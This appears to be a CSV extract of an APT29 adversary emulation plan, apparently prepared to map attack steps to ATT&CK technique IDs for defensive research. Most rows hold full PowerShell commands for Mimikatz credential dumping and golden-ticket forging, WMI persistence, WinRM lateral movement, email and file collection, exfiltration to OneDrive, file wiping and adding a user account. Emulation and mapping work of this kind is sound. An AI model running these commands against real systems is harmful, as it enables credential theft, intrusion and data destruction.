org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
apt29,apt29,unknown,apt29::134,134,Access Token Manipulation: Create Process with Token,attack_id: T1134.002 | name: Access Token Manipulation: Create Process with Token,"[""T1134.002""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::135,135,Credential Dumping,"id: 4ef6009d-2d62-4bb4-8de9-0458df2e9567 | name: Credential Dumping | description: Dumping credentials via wmidump (Mimikatz) | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/ | procedure_group: procedure_cred_access | procedure_step: 14.B | platforms: windows: psh,pwsh: command: . .\stepFourteen_credDump.ps1;
 | payloads: stepFourteen_credDump.ps1 | executors: name: powershell | command: . .\stepFourteen_credDump.ps1;
","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::136,136,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::137,137,Stage Mimikatz Binary,"id: 1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24 | name: Stage Mimikatz Binary | description: Staging Mimikatz Binary for later execution | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/ | procedure_group: procedure_cred_access | procedure_step: 14.C | platforms: windows: psh,pwsh: command: write-host ""[+] Successfully downloaded m.exe"";
 | payloads: m.exe | executors: name: powershell | command: write-host ""[+] Successfully downloaded m.exe"";
","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::138,138,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::139,139,WMI Persistence technique,"id: 43aad2d6-d16a-4adb-aa2b-9510a3be4c52 | name: WMI Persistence technique | description: user triage | tactic: persistence | technique: attack_id: T1546.003 | name: Event Triggered Execution: Windows Management Instrumentation Event Subscription | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_persistence | procedure_step: 15.A | platforms: windows: psh,pwsh: command: Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter"";
if ($?) {
  write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script."";
  exit 1;
} else {
  . .\stepFifteen_wmi.ps1;
  wmi;
  if ($?) {
    write-host ""[+] WMI script has successfully executed!"";
    exit 0;
  }
  exit 1;
}
 | payloads: stepFifteen_wmi.ps1 | executors: name: powershell | command: Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter"";
if ($?) {
  write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script."";
  exit 1;
} else {
  . .\stepFifteen_wmi.ps1;
  wmi;
  if ($?) {
    write-host ""[+] WMI script has successfully executed!"";
    exit 0;
  }
  exit 1;
}
","[""T1546.003""]","[""T1546""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::140,140,Event Triggered Execution: Windows Management Instrumentation Event Subscription,attack_id: T1546.003 | name: Event Triggered Execution: Windows Management Instrumentation Event Subscription,"[""T1546.003""]","[""T1546""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::141,141,Enumerate Domain Controller,"id: 1c8552c7-f7ed-4523-b640-72d65af5f855 | name: Enumerate Domain Controller | description: Get domain controller and current user SID for the domain | tactic: discovery | technique: attack_id: T1018 | name: Remote System Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 16.A | platforms: windows: psh,pwsh: command: . .\powerview.ps1;
get-netdomaincontroller;
 | payloads: powerview.ps1 | executors: name: powershell | command: . .\powerview.ps1;
get-netdomaincontroller;
","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::142,142,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::143,143,Enumerate Domain SID,"id: a42be479-fc26-4d7c-9e63-7a9b74e4c8d2 | name: Enumerate Domain SID | description: Get domain user SID | tactic: discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 16.B | platforms: windows: psh,pwsh: command: . .\stepSixteen_SID.ps1;
siduser;
 | payloads: stepSixteen_SID.ps1 | executors: name: powershell | command: . .\stepSixteen_SID.ps1;
siduser;
","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::144,144,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::145,145,Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping,"id: acecc8f7-18c2-41fd-87bc-39ffd644e4e9 | name: Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping | description: Establish connection to Domain Controller | tactic: lateral-movement | technique: attack_id: T1105 | name: Ingress Tool Transfer | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_lat_movement | procedure_step: 16.C | platforms: windows: psh,pwsh: command: . .\invoke-winrmsession.ps1;
$session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}"";
Copy-Item m.exe -Destination ""C:\Windows\System32\\"" -ToSession $session -force;
if ($?) {
  write-host ""[+] Successfully copied m.exe to remote host"";
} else {
  write-host ""[!] Error, copying and executing m.exe on remote host"";
}
Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug ""lsadump::lsa /inject /name:krbtgt"" exit} | out-string
 | payloads: invoke-winrmsession.ps1 | m.exe | input_arguments: target.winrm.username: description: Username of winrm target | type: string | default: Administrator | target.winrm.password: description: Password for winrm target user | type: string | default: Password123! | target.winrm.remote_host: description: IP or Hostname of remote host | type: string | default: 192.0.2.20 | executors: name: powershell | command: . .\invoke-winrmsession.ps1;
$session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}"";
Copy-Item m.exe -Destination ""C:\Windows\System32\\"" -ToSession $session -force;
if ($?) {
  write-host ""[+] Successfully copied m.exe to remote host"";
} else {
  write-host ""[!] Error, copying and executing m.exe on remote host"";
}
Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug ""lsadump::lsa /inject /name:krbtgt"" exit} | out-string
","[""T1028"", ""T1105""]","[""T1028"", ""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::146,146,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::147,147,Collect E-mails,"id: b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c | name: Collect E-mails | description: Perform e-mail collection from custom PowerShell module. | tactic: collection | technique: attack_id: T1114.001 | name: Email Collection: Local Email Collection | cti_source: https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html | procedure_group: procedure_collection | procedure_step: 17.A | platforms: windows: psh,pwsh: command: . .\stepSeventeen_email.ps1;
Write-Host ""Emails Collected"";
 | payloads: stepSeventeen_email.ps1 | executors: name: powershell | command: . .\stepSeventeen_email.ps1;
Write-Host ""Emails Collected"";
","[""T1114.001""]","[""T1114""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::148,148,Email Collection: Local Email Collection,attack_id: T1114.001 | name: Email Collection: Local Email Collection,"[""T1114.001""]","[""T1114""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::149,149,Collect Files & Compress Collection,"id: fc231955-774f-442c-ac0e-e74dfda50c5c | name: Collect Files & Compress Collection | description: Collect a specific document from a target machine. | tactic: collection | technique: attack_id: T1005 | name: Data from Local System | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_collection | procedure_step: 17.B | platforms: windows: psh,pwsh: command: try{
  if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) {
    New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force;
  }
} catch {
  write-host ""[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt"";
  exit 1;
}

if (! (test-path -path ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"")) {
  write-host ""[!] Error, MITRE-ATTACK-EVALS.HTML was not found."";
  exit 1;
}
Copy-Item ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"" -Destination ""C:\Windows\Temp\WindowsParentalControlMigration"" -force;
. .\stepSeventeen_zip.ps1;
zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
if ($?) {
  write-host ""[+] Documents successfully staged for collection."";
}
 | payloads: stepSeventeen_zip.ps1 | input_arguments: profile_user_day2: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: try{
  if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) {
    New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force;
  }
} catch {
  write-host ""[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt"";
  exit 1;
}

if (! (test-path -path ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"")) {
  write-host ""[!] Error, MITRE-ATTACK-EVALS.HTML was not found."";
  exit 1;
}
Copy-Item ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"" -Destination ""C:\Windows\Temp\WindowsParentalControlMigration"" -force;
. .\stepSeventeen_zip.ps1;
zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
if ($?) {
  write-host ""[+] Documents successfully staged for collection."";
}
","[""T1005""]","[""T1005""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::150,150,Data from Local System,attack_id: T1005 | name: Data from Local System,"[""T1005""]","[""T1005""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::151,151,Exfiltrate data to OneDrive,"id: 4840d6dd-da13-401a-be46-05db56f4e1e0 | name: Exfiltrate data to OneDrive | description: Transfer data to a OneDrive account | tactic: exfiltration | technique: attack_id: T1537 | name: Transfer Data to Cloud Account | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 18.A | platforms: windows: psh,pwsh: command: $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1);
if($err -Like ""*System error 85*"") {
  Write-Host ""OneDrive net drive is already mounted!"";
} elseif($err -Like ""*System error 67*"") {
  Write-Host ""OneDrive net drive mount failed - Check URL!"";
  Write-Host ""#{onedrive.url}"";
  exit 1;
} elseif($err -Like ""*System error 1244*"") {
  Write-Host ""Could not authenticate to OneDrive - Check Creds!"";
  Write-Host ""User: #{onedrive.username}"";
  Write-Host ""Password: #{onedrive.password}"";
  exit 1;
}

Write-Host ""Mount Successful""
Copy-Item ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"" -Destination ""y:\WindowsParentalControlMigration.tmp"" -Force;
if(!$?){
  exit 1;
}

Write-Host ""Copy Successfull""
exit 0;
 | input_arguments: onedrive.url: description: URL for OneDrive net drive | type: URL | default: https://contoso-my.sharepoint.com/personal/johnd_contoso_onmicrosoft_com/ | onedrive.username: description: Username for OneDrive authentication | type: string | default: Administrator | onedrive.password: description: Password for OneDrive authentication | type: string | default: Password123! | executors: name: powershell | command: $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1);
if($err -Like ""*System error 85*"") {
  Write-Host ""OneDrive net drive is already mounted!"";
} elseif($err -Like ""*System error 67*"") {
  Write-Host ""OneDrive net drive mount failed - Check URL!"";
  Write-Host ""#{onedrive.url}"";
  exit 1;
} elseif($err -Like ""*System error 1244*"") {
  Write-Host ""Could not authenticate to OneDrive - Check Creds!"";
  Write-Host ""User: #{onedrive.username}"";
  Write-Host ""Password: #{onedrive.password}"";
  exit 1;
}

Write-Host ""Mount Successful""
Copy-Item ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"" -Destination ""y:\WindowsParentalControlMigration.tmp"" -Force;
if(!$?){
  exit 1;
}

Write-Host ""Copy Successfull""
exit 0;
","[""T1537""]","[""T1537""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::152,152,Transfer Data to Cloud Account,attack_id: T1537 | name: Transfer Data to Cloud Account,"[""T1537""]","[""T1537""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::153,153,Data Wiping of staged files,"id: f820b93d-6176-4a72-a138-a70b0b549c49 | name: Data Wiping of staged files | description: Securely delete previously staged files. | tactic: impact | technique: attack_id: T1561.001 | name: Disk Wipe: Disk Content Wipe | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_impact | procedure_step: 19.A | platforms: windows: psh,pwsh: command: . .\wipe.ps1;
wipe ""m.exe"";
wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"";
wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";
 | payloads: wipe.ps1 | executors: name: powershell | command: . .\wipe.ps1;
wipe ""m.exe"";
wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"";
wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";
","[""T1561.001""]","[""T1561""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::154,154,Disk Wipe: Disk Content Wipe,attack_id: T1561.001 | name: Disk Wipe: Disk Content Wipe,"[""T1561.001""]","[""T1561""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::155,155,Execute Invoke-Mimikatz,"id: 267bad86-3f06-49f1-9a3e-6522f2a61e7a | name: Execute Invoke-Mimikatz | description: Perfofrm Mimikatz credential collection | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 20.A.1 | platforms: windows: psh,pwsh: command: klist purge;
. .\Invoke-Mimikatz.ps1;
invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt"";
klist;
invoke-command -ComputerName scranton -ScriptBlock {net user /add toby ""pamBeesly<3""};
 | payloads: Invoke-Mimikatz.ps1 | input_arguments: target.domain.name: description: Target domain name | type: string | default: domain | target.sid: description: SID for target user | type: string | default: S-1-5-21-1004336348-1177238915-682003330-512 | target.ntlm: description: NTLM hash for target user | type: string | default: 855c3697d9979e78ac404c4ba2c66533 | target.winrm.username: description: Username for winrm target user | type: string | default: Administrator | executors: name: powershell | command: klist purge;
. .\Invoke-Mimikatz.ps1;
invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt"";
klist;
invoke-command -ComputerName scranton -ScriptBlock {net user /add toby ""pamBeesly<3""};
","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::156,156,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::157,157,Triggering Persistent,"id: afb8d8f7-d059-4825-95ae-c5727e2db320 | name: Triggering Persistent | description: Trigger RegKey persistence by rebooting the machine | tactic: persistence | technique: attack_id: T1218.011 | name: Signed Binary Proxy Execution: Rundll32 | cti_source: https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html | procedure_group: procedure_persistence | procedure_step: 20.B | platforms: windows: psh,pwsh: command: Restart-Computer -Force;
 | executors: name: powershell | command: Restart-Computer -Force;
","[""T1218.011""]","[""T1218""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::158,158,Signed Binary Proxy Execution: Rundll32,attack_id: T1218.011 | name: Signed Binary Proxy Execution: Rundll32,"[""T1218.011""]","[""T1218""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
